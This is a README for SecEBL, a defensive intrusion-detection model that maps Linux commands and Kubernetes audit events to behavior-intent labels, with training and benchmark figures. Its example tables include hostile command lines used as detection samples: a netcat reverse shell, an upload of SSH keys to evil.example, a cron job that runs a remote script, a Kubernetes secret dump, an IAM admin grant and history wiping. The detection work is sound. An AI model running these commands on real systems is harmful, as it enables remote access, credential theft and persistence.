# SecEBL

**Whitepaper (A4 PDF): [secebl_whitepaper_en_a4.pdf](secebl_whitepaper_en_a4.pdf)**

**SecEBL** stands for **Security Event Behavior Labeler**.

SecEBL is an intent-recognition layer for intrusion detection. It maps security
events into explicit behavior-intent labels, then lets a session layer reason
over the sequence of behaviors to detect threat intent.

The first public model family is **SecEBL-Rev20**. It is trained and evaluated
on Linux command lines and normalized Kubernetes AuditLog events, but the design
target is broader: endpoint telemetry, audit logs, cloud audit records, identity
events, container events, and other security-relevant streams.

In one sentence: SecEBL turns security telemetry into explainable behavior
intent, so detection can reason about what an actor is trying to do instead of
only matching known bad strings, fixed allow/deny lists, or opaque risk scores.

## At A Glance

SecEBL-Rev20 is designed to be useful as a practical security-event behavior
layer, not just a small demo model.

| Area | Current release summary |
| --- | --- |
| Behavior vocabulary | 361 Rev20 behavior-intent tags across 12 security behavior groups. |
| Training scale | 86,285 internal corpus rows, 82,895 usable training observations, and 118,858 effective command/tag training pairs. |
| Corpus breadth | Linux commands plus normalized Kubernetes AuditLog events, covering roughly 2,700 distinct Linux first-token/tool forms and common security/operations tooling such as shell utilities, cloud CLIs, IaC tools, containers, databases, secret stores, and K8s tooling. |
| Benchmark scale | 12,594-row internal Linux command benchmark covering all 361 behavior tags, 663 internal Linux sessions, and a 6,286,568-row / 102,117-session pressure stream. |
| L1 accuracy | 98.49% top5 any-hit and 96.44% micro recall@5 on the internal Linux command benchmark; 100.00% top5 coverage on the K8s evaluation set. |
| Inference performance | RTX 5090 spot-check: mean 5,308.72 unique cmdlines/s with FP16 + SDPA; exact raw-event cache lookup measured separately at about 1.8M rows/s. |
| Training setup | `Alibaba-NLP/gte-modernbert-base`, MNRL with hard-negative-aware batches, RTX 5090 32GB, 128 full-pass epochs, batch size 112, about 16.2 hours. |

The public `examples/` directory is intentionally smaller than the internal
benchmark data. It exists so users can run the model locally and inspect outputs
without access to private telemetry.

## First-Time User Path

If you only want to try the release locally, start here:

1. Install the package with `pip install -e .`.
2. Download the model artifact from
   [Hugging Face: willchen0011/SecEBL](https://huggingface.co/willchen0011/SecEBL)
   into `model_artifacts/`.
3. Run `scripts/run_examples.sh`.
4. Inspect `runs/examples/linux_l1/predictions.jsonl`; each row contains ranked
   L1 `top_labels`.

L1 is the stable behavior-labeling API. It outputs ranked behavior evidence,
not an intrusion verdict. L2 is optional and experimental; it runs only when an
L2 artifact such as `model_artifacts/l2_artifacts/logreg.joblib` is available.

## Core Idea

Traditional IDS pipelines often depend on blacklists, allowlists, signatures,
hand-written rules, and low-explainability tabular ML. Those tools still matter.
SecEBL does **not** claim to completely replace them.

The project adds a missing layer: **intent detection**.

```text
raw security event
  -> L1 behavior-intent recognition
  -> L2 session reasoning
  -> alert / review / downstream policy
```

Embedding models are useful here because many telemetry records contain natural
language-like behavior evidence: commands, tool names, arguments, object names,
API verbs, resource paths, and audit messages. A trained embedding model can map
different surface forms into the same behavior, for example credential access,
remote execution, persistence, data staging, or cloud privilege modification.

This is especially useful for:

- LOLT / living-off-the-land behavior where the tool is legitimate but the
  intent is not.
- Rule-writing lag, where new tool syntax appears faster than signatures can be
  maintained.
- Multi-platform telemetry, where the same security behavior appears in Linux,
  Kubernetes, cloud, identity, or application audit streams with different
  syntax.
- Explainable detection, where an alert should be tied to behavior labels
  instead of an opaque model score alone.

### Why Intent Labels Matter

The practical gap SecEBL targets is not simply "classify this command as bad."
Security telemetry is full of legitimate tools used in suspicious ways and
suspicious-looking words used in normal operations. A rule can match a token, but
it often struggles to represent the behavior behind that token without becoming
too broad or too brittle.

SecEBL changes the intermediate representation:

| Traditional signal | Typical limitation | SecEBL representation |
| --- | --- | --- |
| Tool name, token, IOC, or rule hit | Easy to evade or too context-dependent. | Ranked behavior-intent tags such as `spawn_reverse_shell`, `read_credential_material`, or `query_service_health`. |
| Single event risk score | Hard to explain and hard to compose across a session. | Explicit L1 behavior evidence that L2 or another downstream system can aggregate. |
| Platform-specific syntax | Rules have to be rewritten for every log shape. | A shared behavior vocabulary that can map Linux commands, K8s audit logs, and future telemetry into comparable intents. |

This makes the model useful even when the final detection decision still uses
rules, policy, analyst review, or a separate risk engine. The breakthrough is the
middle layer: turning raw events into portable, explainable intent evidence.

## Architecture

SecEBL-Rev20 is split into two layers.

### L1: Behavior-Intent Labeler

L1 is the stable public core. It embeds an event and retrieves behavior tags
from the Rev20 schema.

L1 answers:

```text
What objective behavior is visible in this event?
```

Examples:

- `read_credential_material`
- `execute_in_workload`
- `create_scheduled_task`
- `grant_cloud_privilege`
- `upload_sensitive_content`

L1 intentionally does **not** decide that a single event is an intrusion. A
single command can be risky, benign, or ambiguous depending on sequence and
environment. L1 produces explainable behavior evidence for later reasoning.

### L2: Session Risk Scorer

L2 is an experimental session layer. It consumes cached L1 outputs and aggregates
session-level semantic features:

- tag ratios and counts
- family and marker diversity
- retrieval-score summaries
- professional / routine / operational context ratios
- behavior transitions and compact attack-chain indicators

The current maintained L2 is a lightweight logistic-regression scorer with
session-level semantic features for long operational sessions. It is useful for
research and reproducible experiments, but it should be treated as
**experimental**, not as the final detection architecture. The intended long-term
direction is stronger sequence modeling over intent chains.

Runtime L2 does not use raw command text, user names, host names, or session ids
as scoring features. Session ids may be used by data-prep scripts to assign
review labels, but not as runtime allow/deny lists.

For compatibility with the released L2 artifact, L2 derives its session features
from cached L1 `top_labels` using an internal selected-tag feature path. In
plain terms, L2 filters the cached ranked labels inside its own feature builder
before session scoring. This is not part of the L1 prediction output: L1 still
emits ranked `top_labels` only.

## What This Release Contains

This GitHub release is a compact public release of the SecEBL-Rev20 runtime and
documentation. It includes:

- the Rev20 behavior schema with 361 behavior tags;
- L1 prediction and evaluation helpers for command lines and normalized K8s
  audit events;
- an experimental L2 session scorer that consumes cached L1 outputs;
- a reviewed public subset of the internal Linux final benchmark plus K8s
  AuditLog examples for runnable smoke tests and API demonstration;
- a one-command script for running the public examples on Linux, macOS, or CPU
  fallback environments.

Model weights are intentionally distributed separately on Hugging Face because
they are large: [willchen0011/SecEBL](https://huggingface.co/willchen0011/SecEBL).
The full training corpora, internal benchmarks, private pressure-stream rows,
and private run logs are not redistributed because parts of them contain real
telemetry or real operational context. The public Linux examples are a subset of
the internal Linux final benchmark, and the public K8s examples cover normalized
AuditLog events; together they prove that the release code path runs end to end,
while the headline quality numbers still come from the larger internal
evaluation described below.

## Repository Layout

| Path | Purpose |
| --- | --- |
| `tags_schema_rev20.json` | Canonical Rev20 behavior vocabulary. |
| `secebl_l1/` | L1 tag prediction and evaluation helpers. |
| `secebl_l2/` | Experimental ML L2 session scorer and L2 tag-risk policy. |
| `scripts/run_examples.sh` | One-command public example-data smoke-test runner. |
| `examples/linux/` | Public subset of the internal Linux final benchmark and matching Rev20 labels. |
| `examples/k8s/` | Public normalized Kubernetes AuditLog examples and matching Rev20 labels. |
| `rev20_tag_rfc.md` | Rev20 behavior-tag labeling RFC and boundary examples. |
| `pyproject.toml` | Python package metadata, dependencies, and CLI entry points. |
| `LICENSE`, `NOTICE` | Repository license and attribution notices. |

Training corpora, full internal benchmarks, and private pressure-stream data are
intentionally not included in this public GitHub release because they contain
real operational context.

## Data And Vocabulary

### Rev20 Schema

Rev20 is a flat behavior-tag schema.

| Item | Count |
| --- | ---: |
| Top-level behavior groups | 12 |
| Behavior tags | 361 |

Schema groups:

| Group | Tags |
| --- | ---: |
| `observation_and_discovery` | 51 |
| `configuration_and_log_modification` | 12 |
| `filesystem_and_data` | 33 |
| `execution_and_process` | 28 |
| `network` | 51 |
| `identity_auth_and_secrets` | 31 |
| `persistence_services_and_storage` | 27 |
| `kernel_memory_and_tracing` | 14 |
| `package_build_and_source` | 19 |
| `database_and_infrastructure_services` | 33 |
| `containers_and_cloud_native` | 34 |
| `cloud_control_plane` | 28 |

The schema went through several design iterations. Earlier versions used
multi-axis labels, then a six-axis scheme. Rev20 moved to a flat
behavior-tag vocabulary, represented as `behavior_tags[]` in training and
evaluation label files, because it is easier to evaluate, easier to explain, and
easier for downstream session scoring to consume. Runtime L1 predictions expose
ranked `top_labels` instead. The current schema still preserves semantic
families through policy metadata.

### Training Corpus Summary

The training corpora are not included in this public repository, but the release
baseline was trained from the following internal Rev20 corpora:

| Corpus | Rows | Unique behavior tags | Notes |
| --- | ---: | ---: | --- |
| Linux command corpus | 85,277 | 361 | Mixed generated, reviewed, and manually expanded command examples. |
| Kubernetes AuditLog corpus | 1,008 | 40 | Manually authored normalized K8s audit events. |

The Linux corpus covers roughly 2,700 distinct first-token/tool forms by a
conservative executable-name estimate. Common families include shell utilities,
network tools, package/build tools, cloud CLIs, IaC tools, container tooling,
databases, secret stores, and Kubernetes tooling.

### Training Details

The raw training corpora are not redistributed, but the final public release
uses the following internal Rev20 training run. These numbers are included so
readers can understand the training scale and method without access to the
private telemetry, review queues, or generated tensors.

| Item | Value |
| --- | --- |
| Base model | `Alibaba-NLP/gte-modernbert-base` |
| Training objective | `MultipleNegativesRankingLoss` with hard-negative-aware batches |
| Training hardware | NVIDIA GeForce RTX 5090, 32GB VRAM, `cuda:0` |
| Epochs | 128 full-pass epochs |
| Batch size | 112 |
| Precision | `fp32` |
| Steps | 1,062 steps per epoch; 135,936 total optimizer steps |
| Runtime | 58,291 seconds, about 16.2 hours |
| Sequence length | 160 tokens |
| Optimizer schedule | learning rate `2e-5`, warmup ratio `0.06`, 8,156 warmup steps, weight decay `0.01` |

Training data scale:

| Training artifact | Count | Notes |
| --- | ---: | --- |
| Combined corpus rows | 86,285 | 85,277 Linux command rows plus 1,008 K8s AuditLog rows. |
| Non-empty training observations | 82,895 | Rows with usable behavior labels after skipping 3,390 abstain rows. |
| Base command-tag pairs | 117,092 | Positive command/tag pairs before boundary upsampling. |
| Effective positive pairs | 118,858 | Final pair count after targeted boundary upsampling. |
| Behavior labels | 361 | Full Rev20 behavior vocabulary used on the label side. |

The Linux corpus is intentionally mixed rather than a single synthetic source.
The largest source slices are roughly 36.9k generated rows, 28.5k manually
reviewed rows, 4.0k benchmark-prune/migration rows, 3.6k common-difference gap
rows, 2.7k reviewed generated rows, 2.6k baseline manual rows, and 2.3k attack
batch rows, plus smaller targeted boundary, miss-review, public-attack, and
high-miss batches.

Token lengths are short enough for a compact encoder. Across the final pair set,
command-side text is p50 32 tokens, p90 55, p95 68, and p99 113; fewer than 0.3%
of examples exceed the 160-token training limit. Label-side semantic texts are
p50 40 tokens and p95 62.

Hard negatives were designed in two layers:

- Schema-level negatives: the dataset builder used `schema_hard`, with a
  16-item hard-negative pool and up to 8 negatives per positive before MNRL
  batching. These negatives come from semantically nearby Rev20 tags, so the
  model is forced to separate labels such as read-vs-search, inspect-vs-modify,
  local-vs-remote execution, and similar tool-boundary cases.
- Batch-level negatives: the training loader used hard-negative-aware MNRL
  batches. The final run used config
  `rev20_conservative_20260620_ep96_miss_v11`, covering 74 difficult labels and
  placing 2 hard-negative labels near each anchor where possible.
- Boundary upsampling: 1,766 boundary-sensitive pairs were duplicated once,
  producing 1,766 extra training exposures. These rows target recurring failure
  modes such as grep/read ambiguity, wrapper commands, tool-specific boundaries,
  no-hit review cases, and post-evaluation miss-review batches.

### Public Example Data

**Important: the training corpora and full internal benchmarks are not public
because parts of them contain real telemetry or real operational context.** The
public `examples/` directory contains a reviewed, publicly releasable subset of
the internal Linux final benchmark. It is provided for smoke tests and API
demonstration, and should be read as a subset rather than the full headline
evaluation set.

The full Linux benchmark, training corpora, private pressure-stream data, corpus
review queues, labeling scratch files, generated training tensors, and private
run logs are excluded for that reason. To make the reported metrics interpretable,
this README includes summary statistics for the internal benchmark: row counts,
tag coverage, tag cardinality, and the most frequent tags.

| Public example artifact | Rows | Sessions | Notes |
| --- | ---: | ---: | --- |
| Linux example sessions | 10,520 | 531 | Publicly releasable subset of the internal Linux final benchmark; 2,934 normal-operation rows and 7,586 intrusion rows. |
| Linux example labels | 10,520 | 531 | Matching Rev20 behavior labels; 10,019 labeled rows, 14,807 behavior-label instances, and 349 unique behavior tags. |
| K8s example sessions | 144 | 46 | Public normalized Kubernetes AuditLog examples; 72 normal-operation rows and 72 intrusion rows. |
| K8s example labels | 144 | 46 | Matching Rev20 behavior labels; 144 labeled rows, 163 behavior-label instances, and 27 unique behavior tags. |

The public Linux examples are intended for copy/paste verification of the L1 and
L2 code path. The public K8s examples exercise the normalized AuditLog L1 path.
Session labels are normalized to English enums, while Linux command text is kept
unchanged from the selected internal benchmark subset.

**Validation takeaway: the public subset is large enough to inspect realistic
session structure and L1 labels locally, while the reported quality numbers come
from the larger internal evaluation. The full internal benchmark still includes
additional rows, sessions, and tag coverage beyond this public subset.**

Session-level `expected` and `session_expected` labels use English enums:
`intrusion` and `normal_operation`. These labels are evaluation labels, not a
substitute for production authorization, incident response, or human review.

Internal benchmark summary, not redistributed:

| Internal evaluation set | Rows / sessions | Behavior-tag coverage | Notes |
| --- | ---: | ---: | --- |
| Linux command benchmark | 12,594 rows | 361 / 361 tags | Full L1 behavior-tag evaluation set. |
| Linux session benchmark | 663 sessions | n/a | L2 internal session-level evaluation set. |
| Private pressure stream | 6,286,568 rows / 102,117 sessions | n/a | Large-scale operational stress stream. |

Internal Linux benchmark tag cardinality:

| Tags per row | Rows |
| --- | ---: |
| 0 | 705 |
| 1 | 8,829 |
| 2 | 1,567 |
| 3 | 901 |
| 4 | 402 |
| 5 | 139 |
| 6+ | 51 |

Top internal Linux benchmark tags:

| Tag | Count |
| --- | ---: |
| `stage_temporary_path` | 987 |
| `inspect_network_state` | 801 |
| `stage_hidden_path` | 655 |
| `inspect_current_identity` | 578 |
| `read_credential_material` | 551 |
| `inspect_system_state` | 481 |
| `inspect_infrastructure_service` | 390 |
| `query_dns_records` | 372 |
| `enumerate_filesystem` | 365 |
| `search_credentials` | 315 |

Top public Linux subset tags:

| Tag | Count |
| --- | ---: |
| `stage_temporary_path` | 920 |
| `inspect_network_state` | 758 |
| `stage_hidden_path` | 653 |
| `inspect_current_identity` | 525 |
| `read_credential_material` | 482 |
| `inspect_system_state` | 406 |
| `query_dns_records` | 354 |
| `enumerate_filesystem` | 334 |
| `inspect_infrastructure_service` | 317 |
| `search_credentials` | 299 |

## L1 Results

These results are for the public SecEBL-Rev20 release model distributed through
Hugging Face. The internal training/evaluation run that produced the model is
not redistributed; only aggregate benchmark statistics are documented here.

Evaluation scale:

| Dataset | Rows | Rows with labels | Behavior-tag instances | Unique behavior tags |
| --- | ---: | ---: | ---: | ---: |
| Linux internal benchmark | 12,594 | 11,889 | 17,287 | 361 / 361 |
| K8s evaluation set | 144 | 144 | 163 | 27 / 361 |
| Combined | 12,738 | 12,033 | 17,450 | 361 / 361 |

Retrieval quality:

| Dataset | Dynamic exact | Top5 any-hit | Top5 all-covered | Micro recall@5 |
| --- | ---: | ---: | ---: | ---: |
| Linux internal benchmark | 87.32% | 98.49% | 95.44% | 96.44% |
| K8s evaluation set | 99.31% | 100.00% | 100.00% | 100.00% |
| Combined | 87.47% | 98.50% | 95.50% | 96.47% |

**These headline L1 metrics were measured on internal evaluation data, not on the
public `examples/` subset.** The Linux benchmark covers the complete 361-tag
Rev20 vocabulary and includes complex multi-tag command rows; maintaining 98.49%
top5 any-hit and 96.44% micro recall@5 on that set is the main evidence that L1
is robust beyond toy examples. The K8s number should be read as a small-domain
sanity result rather than broad Kubernetes coverage: the current K8s corpus is
much smaller than the Linux corpus and covers fewer behavior tags. The strongest
remaining L1 weakness is strict exact matching on dense multi-tag rows. The key
accuracy and performance numbers are summarized in this README.

### Fine-Grained Contrast Examples

These examples were scored with the public SecEBL-Rev20 release model. Scores
are cosine/retrieval scores after the release prompt profile. The table shows
top 3 labels.

| Event | Top 3 L1 tags | Note |
| --- | --- | --- |
| `nc -e /bin/sh 203.0.113.10 4444` | <code>spawn_reverse_shell</code> 0.811<br><code>connect_external_service</code> 0.488<br><code>spawn_bind_shell</code> 0.451 | `-e` is recognized as reverse-shell execution. |
| `nc -v 203.0.113.10 443` | <code>connect_external_service</code> 0.732<br><code>spawn_reverse_shell</code> 0.503<br><code>create_reverse_tunnel</code> 0.412 | Connection intent ranks above shell-spawn intent. |
| `cat /root/install.log` | <code>read_business_log</code> 0.641<br><code>read_system_log</code> 0.431<br><code>read_workload_logs</code> 0.385 | Log-read semantics dominate. |
| `cat /root/install.conf` | <code>read_infrastructure_config</code> 0.620<br><code>read_system_config</code> 0.612<br><code>read_kernel_parameter</code> 0.336 | Config-read semantics dominate. |
| `grep -a "password" /var/log/auth.log` | <code>read_auth_audit_log</code> 0.675<br><code>search_credentials</code> 0.609<br><code>read_credential_material</code> 0.507 | Auth-log read plus credential-search evidence. |
| `grep -v "DEBUG" /var/log/app.log` | <code>read_business_log</code> 0.824<br><code>delete_business_log</code> 0.515<br><code>read_business_config</code> 0.315 | Negative filter is still primarily log-read behavior. |
| `grep "password" /etc/shadow` | <code>search_credentials</code> 0.752<br><code>read_credential_material</code> 0.698<br><code>crack_credential_material</code> 0.296 | Shadow-file password search maps to credential access. |
| `grep "password incorrect" /var/log/auth.log` | <code>read_auth_audit_log</code> 0.731<br><code>search_credentials</code> 0.548<br><code>read_credential_material</code> 0.452 | Ambiguous token evidence remains; context/L2 should decide final risk. |

### Intrusion-Like Examples

| Event | Top 3 L1 tags | Why it is useful |
| --- | --- | --- |
| `tar czf /tmp/ssh.tgz ~/.ssh && curl -F file=@/tmp/ssh.tgz https://evil.example/upload` | <code>archive_sensitive_content</code> 0.521<br><code>upload_credential_material</code> 0.494<br><code>read_ssh_policy</code> 0.472 | Credential material staging and upload. |
| `echo "* * * * * root curl -fsSL http://evil.example/p.sh \| bash" > /etc/cron.d/sys-updater` | <code>create_scheduled_task</code> 0.789<br><code>create_startup_script</code> 0.435<br><code>execute_scheduled_task</code> 0.323 | Persistence via scheduled execution. |
| `kubectl -n prod get secret payment-api-token -o jsonpath={.data.token} \| base64 -d` | <code>read_cluster_secret</code> 0.730<br><code>decode_data</code> 0.716<br><code>read_credential_material</code> 0.363 | K8s secret extraction and decoding. |
| `aws iam attach-user-policy --user-name temp --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` | <code>grant_cloud_privilege</code> 0.838<br><code>modify_cloud_identity_policy</code> 0.535<br><code>modify_cloud_identity</code> 0.459 | Cloud privilege escalation semantics. |
| `history -c && rm -f ~/.bash_history` | <code>clear_shell_history</code> 0.861<br><code>securely_delete_data</code> 0.428<br><code>clear_login_history</code> 0.393 | Anti-forensic shell-history clearing. |

### Normal Operation Examples

| Event | Top 3 L1 tags | Why it is useful |
| --- | --- | --- |
| `dig api.internal.example.com +short` | <code>query_dns_records</code> 0.811<br><code>enumerate_cloud_accounts</code> 0.351<br><code>perform_dns_zone_transfer</code> 0.320 | DNS lookup is separated from broad network probing. |
| `journalctl -u nginx --since "10 minutes ago" --no-pager` | <code>read_infrastructure_log</code> 0.767<br><code>delete_infrastructure_log</code> 0.395<br><code>read_business_log</code> 0.271 | Service log inspection. |
| `du -sh /var/log/* \| sort -h \| tail` | <code>read_system_log</code> 0.655<br><code>inspect_storage_state</code> 0.645<br><code>modify_storage_volume</code> 0.368 | Storage/log inspection, not destructive behavior. |
| `docker ps --format "{{.Names}} {{.Status}}"` | <code>enumerate_containers</code> 0.821<br><code>inspect_container_runtime</code> 0.540<br><code>enumerate_workloads</code> 0.483 | Container inventory. |
| `curl -fsS http://127.0.0.1:8080/healthz` | <code>query_service_health</code> 0.840<br><code>inspect_local_kubernetes_cluster</code> 0.459<br><code>inspect_container_runtime</code> 0.383 | Local service health check. |

### Normal Maintenance / Operations Examples

| Event | Top 3 L1 tags | Why it is useful |
| --- | --- | --- |
| `systemctl restart nginx && systemctl status nginx --no-pager` | <code>inspect_service</code> 0.671<br><code>modify_service_state</code> 0.669<br><code>enable_service</code> 0.332 | Service restart plus verification. |
| `kubectl -n prod rollout restart deployment/payment-api` | <code>modify_workload</code> 0.799<br><code>modify_container_state</code> 0.444<br><code>inspect_workload</code> 0.428 | Workload rollout maintenance. |
| `pg_dump -h db.internal -U backup appdb \| gzip > /backup/appdb-$(date +%F).sql.gz` | <code>compress_data</code> 0.731<br><code>export_database_dump</code> 0.682<br><code>manage_database_backup</code> 0.470 | Database backup behavior. |
| `trivy image registry.internal/app/payment-api:20260621` | <code>scan_container_image</code> 0.701<br><code>enumerate_container_images</code> 0.373<br><code>inspect_container_image</code> 0.349 | Container image security scan. |
| `terraform plan -out tfplan && terraform show -no-color tfplan` | <code>plan_infrastructure_template</code> 0.843<br><code>initialize_infrastructure_template</code> 0.368<br><code>read_infrastructure_config</code> 0.353 | Infrastructure planning, not apply/destroy. |

## L1 Performance

SecEBL-Rev20 is a SentenceTransformers-style embedding retriever over 361 Rev20
tag definitions. The serving path embeds the event, embeds or loads tag
definition embeddings, then ranks tags by similarity.

Current single-card CUDA recommendation:

| Setting | Value |
| --- | --- |
| Precision | FP16 |
| Attention | SDPA |
| `max_seq_length` | 160 |
| Batch size | 224 default; 384 was slightly faster in one RTX 5090 sweep but not enough to replace the stable default |
| Sorting | `sort_by=char` |
| Padding | dynamic, no forced pad alignment |
| Output path | GPU tensor output plus GPU top-k |

Measured on an NVIDIA GeForce RTX 5090 32GB spot-check:

| Mode | Throughput |
| --- | ---: |
| Recommended no-cache unique inference, `bs224` | mean 5,308.72 unique cmdlines/s |
| Recommended no-cache latency, `bs224` | about 0.1884 ms per unique cmdline |
| `bs224` repeat range | 5,025.47 - 5,433.78 unique cmdlines/s |
| Best quick-sweep point, `bs384` | 5,378.45 unique cmdlines/s |

Exact raw-event cache lookup was measured separately at mean 1,817,462.76
rows/s. Cache hits reuse saved L1 top-k results and do not run model inference.

Main optimization points:

- FP16 inference with SDPA attention.
- Keep command embeddings and tag embeddings on GPU.
- Run top-k on GPU instead of copying full embedding matrices to NumPy.
- Sort batches by command length to reduce padding waste.
- Use exact raw-event caching for repeated high-volume streams.

The cache key is the exact raw event string. Cache hits reuse the same L1 top-k
prediction and do not change model semantics.

## L2 Results

These results are for the optimized L2 scorer shipped with the current public
model artifact when `l2_artifacts/logreg.joblib` is present.

In this release, a **session** is a sequence of events grouped by `session_id`.
For Linux command examples, that usually means a command history or audit-event
sequence from the same activity window. L1 labels each event independently; L2
scores the whole session by aggregating the cached L1 ranked tags, retrieval
scores, tag diversity, behavior transitions, and routine-operation context. The
L2 output is therefore a session-level verdict such as `intrusion` or
`normal_operation`, not a replacement for per-command behavior tags.

**L2 is an experimental fitted session scorer, and its high accuracy should be
read in that exact scope.** It is optimized for the current internal experiment:
fitting a lightweight session algorithm over L1 semantic features, then checking
it against the withheld Linux internal sessions and a 7M-row pressure stream. The
high session accuracy below is therefore evidence that this fitted L2 setup
works well on the current complex internal benchmark and pressure data. It is
not an independent claim of general production IDS accuracy, and it should not
be compared directly to L1 tag-retrieval metrics.

Internal Linux session benchmark result:

| Sessions | TP | FN | FP | TN | Attack recall | Normal recall | Attack precision |
| ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: |
| 663 | 365 | 0 | 0 | 298 | 100.00% | 100.00% | 100.00% |

Internal 7M pressure-stream result:

| Rows | Sessions | Alert sessions | Real alert sessions | Synthetic alert sessions |
| ---: | ---: | ---: | ---: | ---: |
| 6,286,568 | 102,117 | 61 | 1 | 60 |

**The 7M pressure result is a fit-check on real background telemetry plus
embedded attack sessions, not a public benchmark.** The 61 alert sessions
include one reviewed real attack-like pressure session and 60 synthetic attack
sessions embedded in the pressure stream. The underlying pressure-stream rows
and real session identifiers are not redistributed.

L2 training/evaluation mixture:

| Item | Count |
| --- | ---: |
| L2 sessions | 5,747 |
| Positive sessions | 426 |
| Negative sessions | 5,321 |
| Synthetic pressure positive sessions | 60 |
| Reviewed real pressure positive sessions | 1 |
| Random real pressure background negative sessions | 5,000 |
| Reviewed hard-negative pressure sessions | 23 |

L2 OOF validation:

| Metric | Value |
| --- | ---: |
| Accuracy | 99.39% |
| Attack precision | 96.44% |
| Attack recall | 95.31% |
| Normal recall | 99.72% |
| TP / FN / FP / TN | 406 / 20 / 15 / 5,306 |

L2 performance, pure in-memory session state plus final scoring:

| Events | Mean throughput | Best throughput |
| ---: | ---: | ---: |
| 1,000,000 | 151,169 events/s | 159,695 events/s |

L2 is intentionally documented as experimental. It is included so users can
reproduce session-level experiments, but L1 behavior-intent recognition is the
main stable release artifact.

## Quick Start

Install the helper package:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
```

Download the SecEBL-Rev20 model artifact from
[Hugging Face: willchen0011/SecEBL](https://huggingface.co/willchen0011/SecEBL)
into `model_artifacts/`. The directory must contain the embedding model files
and `semantic_texts.jsonl`. L1 public example metrics are computed from top-k
rankings, so no L1 threshold tuning is required for the public example path.

The example runner does not download model weights automatically. It expects the
model artifacts to already exist locally.

For example:

```bash
git lfs install
git clone https://huggingface.co/willchen0011/SecEBL model_artifacts
```

Key local artifact files:

```text
model_artifacts/
  config.json
  modules.json
  model.safetensors
  semantic_texts.jsonl
  l2_artifacts/logreg.joblib          # optional, enables L2 example scoring
```

The Hugging Face clone also includes tokenizer files and SentenceTransformers
module directories used by the embedding model.

### Predict Tags

Single Linux command:

```bash
secebl-predict-tags \
  --model model_artifacts \
  --data-dir model_artifacts \
  --text 'nc -e /bin/sh 203.0.113.10 4444' \
  --output runs/demo/predictions.jsonl
```

Single normalized Kubernetes AuditLog event:

```bash
secebl-predict-tags \
  --model model_artifacts \
  --data-dir model_artifacts \
  --text 'k8s_audit verb=create resource=pods subresource=exec namespace=prod requestObject=command=/bin/sh' \
  --output runs/demo/k8s_predictions.jsonl
```

JSONL input is also supported. The predictor reads the first available field in
`cmdline`, `command`, `k8slog`, `raw`, `event`, or `message`:

```bash
secebl-predict-tags \
  --model model_artifacts \
  --data-dir model_artifacts \
  --input my_events.jsonl \
  --output runs/my_events/predictions.jsonl
```

The output contains `command` and `top_labels`. `top_labels` is the ranked Rev20
behavior evidence list; each item contains a `label_id`, score, and behavior
group. The reported L1 metrics are computed from top-k coverage.

Example output row:

```json
{
  "observation_id": "event:0",
  "command": "nc -e /bin/sh 203.0.113.10 4444",
  "top_labels": [
    {"label_id": "spawn_reverse_shell", "score": 0.811, "axis": "execution_and_process"},
    {"label_id": "connect_external_service", "score": 0.488, "axis": "network"}
  ]
}
```

L1 does not emit `behavior_tags` or a final verdict. Downstream code should use
the ranked `top_labels` list.

### Run Public Examples

Run the public Linux benchmark-subset and K8s AuditLog example-data L1 paths
with automatic device selection.
The script uses CUDA on NVIDIA, MPS on macOS Apple Silicon when available, and
CPU otherwise:

```bash
scripts/run_examples.sh
```

Useful overrides:

```bash
MODEL_DIR=/path/to/model_artifacts \
OUT_DIR=runs/examples_mac \
DEVICE=mps \
BATCH_SIZE=64 \
scripts/run_examples.sh
```

If an L2 model is available, the script will auto-detect
`model_artifacts/l2_artifacts/logreg.joblib` and continue into Linux
example-session scoring. You can also set `L2_MODEL` explicitly:

```bash
L2_MODEL=model_artifacts/l2_artifacts/logreg.joblib scripts/run_examples.sh
```

### Manual Example Commands

Generate L1 predictions for the Linux public example label set:

```bash
secebl-predict-benchmark-tags \
  --benchmark examples/linux/example_gold.rev20.jsonl \
  --model model_artifacts \
  --data-dir model_artifacts \
  --save-top-k 5 \
  --prompt-profile mid \
  --out-dir runs/example_gold_l1
```

Evaluate command-level example labels:

```bash
secebl-eval-gold \
  --gold examples/linux/example_gold.rev20.jsonl \
  --predictions runs/example_gold_l1/predictions.jsonl \
  --out runs/example_gold_l1/top5_tag_accuracy.json
```

Generate and evaluate L1 predictions for the K8s public example label set:

```bash
secebl-predict-benchmark-tags \
  --benchmark examples/k8s/example_gold.rev20.jsonl \
  --model model_artifacts \
  --data-dir model_artifacts \
  --save-top-k 5 \
  --prompt-profile mid \
  --out-dir runs/example_k8s_l1

secebl-eval-gold \
  --gold examples/k8s/example_gold.rev20.jsonl \
  --predictions runs/example_k8s_l1/predictions.jsonl \
  --out runs/example_k8s_l1/top5_tag_accuracy.json
```

Score sessions with an ML L2 artifact:

```bash
secebl-l2 score \
  --input examples/linux/example_sessions.jsonl \
  --predictions runs/example_gold_l1/predictions.jsonl \
  --risk-policy secebl_l2/tag_risk_policy.rev20.json \
  --model model_artifacts/l2_artifacts/logreg.joblib \
  --output runs/l2/example_session_results.json
```

## License And Compliance

This GitHub repository contains code, documentation, schemas, policy metadata,
and public example data. These repository contents are Apache-2.0 unless a file
explicitly states otherwise.

Model weights are not included in this GitHub repository. SecEBL-Rev20 model
artifacts are published separately on
[Hugging Face: willchen0011/SecEBL](https://huggingface.co/willchen0011/SecEBL)
and are governed by the model license and model card distributed with that
Hugging Face release. Download the model artifact into `model_artifacts/`
before running the prediction examples.

The base model is `Alibaba-NLP/gte-modernbert-base`, which is Apache-2.0. SecEBL
adds the Rev20 schema, private training/evaluation artifacts, L1 helpers, public
examples, and experimental L2 scorer.

Do not use this release as a substitute for legal, compliance, incident response,
or production authorization review. Treat model outputs as security evidence for
analysis and downstream policy, not as an autonomous enforcement decision.
